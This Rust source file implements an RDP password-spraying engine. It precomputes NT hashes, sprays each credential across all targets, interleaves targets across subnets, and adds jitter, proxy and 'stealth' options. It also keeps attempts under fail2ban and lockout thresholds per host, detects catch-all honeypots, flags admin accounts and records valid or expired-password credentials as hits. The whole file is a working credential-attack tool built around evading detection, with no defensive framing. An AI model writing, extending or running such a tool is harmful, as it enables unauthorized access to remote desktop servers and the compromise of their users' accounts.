use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use async_channel::{bounded, Receiver, Sender};
use dashmap::DashSet;

use crate::evasion::{apply_jitter, interleave_targets, AttemptTracker};
use crate::honeypot::check_canary_trap;
use crate::ntlm::compute_nt_hash;
use crate::rdp::{check_credentials, parse_target, Engine, RdpCheckConfig};
use crate::triage::ResultWriter;
use crate::ui::{EngineStats, LiveUi};

#[derive(Clone)]
pub struct SprayJob {
    pub target: String,
    pub domain: String,
    pub user: String,
    pub pass: String,
    pub nt_hash: [u8; 16],
}

pub struct SprayEngine {
    pub workers: usize,
    pub timeout_ms: u64,
    pub max_tries_per_host: usize,
    pub interleave: bool,
    pub canary_check: bool,
    pub max_jitter_ms: u64,
    pub proxy: Option<String>,
    pub stealth: bool,
    pub writer: Arc<ResultWriter>,
    pub stats: Arc<EngineStats>,
    pub ui: Arc<LiveUi>,
    pub successful_targets: DashSet<String>,
    pub tracker: Arc<AttemptTracker>,
    pub is_running: Arc<AtomicBool>,
}

impl SprayEngine {
    pub fn new(
        workers: usize,
        timeout_ms: u64,
        max_tries_per_host: usize,
        interleave: bool,
        canary_check: bool,
        max_jitter_ms: u64,
        proxy: Option<String>,
        stealth: bool,
        writer: Arc<ResultWriter>,
        stats: Arc<EngineStats>,
        ui: Arc<LiveUi>,
    ) -> Self {
        Self {
            workers,
            timeout_ms,
            max_tries_per_host,
            interleave,
            canary_check,
            max_jitter_ms,
            proxy,
            stealth,
            writer,
            stats,
            ui,
            successful_targets: DashSet::new(),
            tracker: Arc::new(AttemptTracker::new(max_tries_per_host)),
            is_running: Arc::new(AtomicBool::new(true)),
        }
    }

    pub fn stop(&self) {
        self.is_running.store(false, Ordering::SeqCst);
    }

    pub async fn run(
        &self,
        targets: Vec<String>,
        creds: Vec<(String, String, String)>, // (domain, user, pass)
    ) -> anyhow::Result<()> {
        if targets.is_empty() {
            anyhow::bail!("No targets provided");
        }
        if creds.is_empty() {
            anyhow::bail!("No credentials provided");
        }

        // 1. Interleave targets across /24 subnets if enabled
        let processed_targets = if self.interleave {
            interleave_targets(&targets)
        } else {
            targets
        };

        // 2. Precompute NT-hashes for all credentials
        let mut precomputed_creds: Vec<(String, String, String, [u8; 16])> = Vec::with_capacity(creds.len());
        for (dom, usr, pass) in creds {
            let hash = compute_nt_hash(&pass);
            precomputed_creds.push((dom, usr, pass, hash));
        }

        let total_tasks = (processed_targets.len() * precomputed_creds.len()) as u64;
        self.stats.total_tasks.store(total_tasks, Ordering::SeqCst);

        let (tx, rx): (Sender<SprayJob>, Receiver<SprayJob>) = bounded(self.workers * 4);

        // 3. Spawn workers
        let mut worker_handles = Vec::with_capacity(self.workers);
        for _ in 0..self.workers {
            let rx = rx.clone();
            let engine = self.clone_ref();
            let handle = tokio::spawn(async move {
                engine.worker_loop(rx).await;
            });
            worker_handles.push(handle);
        }

        // 4. Producer: Horizontal Spraying
        // For each credential, spray across ALL targets, then proceed to next credential!
        let tx_producer = tx.clone();
        let running_flag = self.is_running.clone();
        let tracker = self.tracker.clone();
        let stats = self.stats.clone();
        let success_set = self.successful_targets.clone();

        let producer_handle = tokio::spawn(async move {
            for (domain, user, pass, nt_hash) in precomputed_creds {
                for target in &processed_targets {
                    if !running_flag.load(Ordering::Relaxed) {
                        return;
                    }

                    // Skip if target already cracked
                    if success_set.contains(target) {
                        stats.completed_tasks.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }

                    // Enforce Fail2ban / Lockout threshold per host
                    let (host, _) = parse_target(target);
                    if !tracker.can_attempt(&host) {
                        stats.f2b_guarded.fetch_add(1, Ordering::Relaxed);
                        stats.completed_tasks.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }

                    let job = SprayJob {
                        target: target.clone(),
                        domain: domain.clone(),
                        user: user.clone(),
                        pass: pass.clone(),
                        nt_hash,
                    };

                    if tx_producer.send(job).await.is_err() {
                        return;
                    }
                }
            }
        });

        // 5. Run Live UI update loop
        let ui_ref = self.ui.clone();
        let running_ui = self.is_running.clone();
        let stats_ui = self.stats.clone();
        let ui_handle = tokio::spawn(async move {
            while running_ui.load(Ordering::Relaxed) {
                ui_ref.render();
                tokio::time::sleep(Duration::from_millis(250)).await;
                if stats_ui.completed_tasks.load(Ordering::Relaxed) >= stats_ui.total_tasks.load(Ordering::Relaxed) {
                    break;
                }
            }
            ui_ref.render();
        });

        // Wait for producer to finish
        let _ = producer_handle.await;
        drop(tx); // Close channel

        // Wait for workers to drain
        for h in worker_handles {
            let _ = h.await;
        }

        self.is_running.store(false, Ordering::SeqCst);
        let _ = ui_handle.await;

        Ok(())
    }

    async fn worker_loop(&self, rx: Receiver<SprayJob>) {
        while let Ok(job) = rx.recv().await {
            if !self.is_running.load(Ordering::Relaxed) {
                break;
            }

            self.execute_task(job).await;
            self.stats.completed_tasks.fetch_add(1, Ordering::Relaxed);
        }
    }

    async fn execute_task(&self, job: SprayJob) {
        apply_jitter(self.max_jitter_ms).await;

        let (host, port) = parse_target(&job.target);

        let mut cfg = RdpCheckConfig::new(&host, port, &job.user, &job.pass, &job.domain);
        cfg.timeout_ms = self.timeout_ms;
        cfg.engine = Engine::Custom;
        cfg.precomputed_nt_hash = Some(job.nt_hash);
        cfg.stealth = self.stealth;
        cfg.proxy = self.proxy.clone();

        let start = Instant::now();
        match check_credentials(&cfg).await {
            Ok(auth) => {
                let rtt = start.elapsed();

                if auth.success {
                    // Check for catch-all honeypot
                    if self.canary_check && check_canary_trap(&job.target, self.timeout_ms, self.proxy.clone()).await {
                        self.stats.honeypots.fetch_add(1, Ordering::Relaxed);
                        self.writer.record_honeypot(&job.target, &job.user, &job.pass);
                        self.ui.add_hit(format!(
                            "\x1b[33m[🍯 HONEYPOT]\x1b[0m {} | {}:{} | Catch-All Fake RDP Disqualified",
                            job.target, job.user, job.pass
                        ));
                        return;
                    }

                    // Legitimate Hit
                    self.successful_targets.insert(job.target.clone());
                    self.tracker.retire_host(&host);
                    self.stats.goods.fetch_add(1, Ordering::Relaxed);

                    let os_str = auth.domain_info
                        .as_ref()
                        .and_then(|d| d.os_version.as_deref())
                        .unwrap_or("Windows");
                    let dom_str = auth.domain_info
                        .as_ref()
                        .map(|d| d.nb_domain.as_str())
                        .unwrap_or(&job.domain);

                    let is_admin = job.user.to_lowercase().contains("admin");
                    let priv_tag = if is_admin {
                        "\x1b[31;1mADMIN\x1b[0m"
                    } else {
                        "\x1b[32mUSER\x1b[0m"
                    };

                    self.writer.record_good(&job.target, &job.domain, &job.user, &job.pass, auth.domain_info.as_ref(), rtt);

                    self.ui.add_hit(format!(
                        "\x1b[32;1m[✅ HIT]\x1b[0m {} | {}\\{}:{} | {} | {} | {}ms",
                        job.target, dom_str, job.user, job.pass, priv_tag, os_str, rtt.as_millis()
                    ));
                } else if let Some(code) = auth.ntstatus {
                    if code == 0xC0000234 {
                        // STATUS_ACCOUNT_LOCKED_OUT
                        self.stats.lockouts.fetch_add(1, Ordering::Relaxed);
                        self.tracker.retire_host(&host); // Stop spraying locked host
                    } else if code == 0xC0000071 || code == 0xC0000224 {
                        // STATUS_PASSWORD_EXPIRED or STATUS_PASSWORD_MUST_CHANGE
                        self.stats.goods.fetch_add(1, Ordering::Relaxed);
                        self.writer.record_good(&job.target, &job.domain, &job.user, &job.pass, auth.domain_info.as_ref(), rtt);
                        self.ui.add_hit(format!(
                            "\x1b[33;1m[🔑 EXPIRED]\x1b[0m {} | {}:{} (Valid Creds - Password Expired)",
                            job.target, job.user, job.pass
                        ));
                    } else {
                        self.stats.errors.fetch_add(1, Ordering::Relaxed);
                    }
                } else {
                    self.stats.errors.fetch_add(1, Ordering::Relaxed);
                }
            }
            Err(_) => {
                self.stats.errors.fetch_add(1, Ordering::Relaxed);
            }
        }
    }

    fn clone_ref(&self) -> Self {
        Self {
            workers: self.workers,
            timeout_ms: self.timeout_ms,
            max_tries_per_host: self.max_tries_per_host,
            interleave: self.interleave,
            canary_check: self.canary_check,
            max_jitter_ms: self.max_jitter_ms,
            proxy: self.proxy.clone(),
            stealth: self.stealth,
            writer: self.writer.clone(),
            stats: self.stats.clone(),
            ui: self.ui.clone(),
            successful_targets: self.successful_targets.clone(),
            tracker: self.tracker.clone(),
            is_running: self.is_running.clone(),
        }
    }
}
